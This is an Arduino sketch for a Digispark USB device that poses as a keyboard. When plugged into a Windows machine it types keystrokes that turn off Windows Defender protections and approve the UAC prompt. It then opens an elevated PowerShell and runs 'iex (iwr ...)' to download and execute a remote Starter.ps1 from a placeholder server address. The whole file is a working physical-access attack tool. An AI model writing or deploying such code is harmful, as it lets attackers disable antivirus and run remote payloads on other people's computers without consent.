#include "DigiKeyboard.h"
#define KEY_LEFT_ARROW 0x50

void setup() {
  DigiKeyboard.delay(5000);  // Wait for USB recognition

  // --- Step 1: Disable Windows Defender ---
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Open Run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("windowsdefender:");
  DigiKeyboard.delay(500);

  for (int i = 0 ; i < 2;i++){
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);  // Wait for window to load
  }
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(400);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  // Manage settings
  DigiKeyboard.delay(1000);

  // Disable protections (tab to toggle switches and hit space)
  for (int i = 0; i < 7; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(300);
  }

  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(800);

  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1200);  // Small delay

  // Simulate pressing Enter to confirm the action (approve UAC)
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);  // Small delay
  
  // Close Defender window (Alt + F4)
  DigiKeyboard.sendKeyStroke(0x3D, MOD_ALT_LEFT);
  DigiKeyboard.delay(800);

  // --- Step 2: Execute remote PowerShell script ---
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Open Run again
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell"); 
  DigiKeyboard.delay(500);

  // Step 3: Press Ctrl + Shift + Enter to run as admin
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000); // Wait for UAC to appear

  // Step 4: Approve UAC with keyboard navigation
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);  // Select "Yes" (if focus isn't already there)
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);       // Confirm "Yes"
  DigiKeyboard.delay(1000); // Let PowerShell open

  // Use iex (iwr...) to run the remote Starter.ps1 script
  DigiKeyboard.print("iex (iwr 'http://<SERVER_IP>/tools/Starter.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // No loop actions needed
}

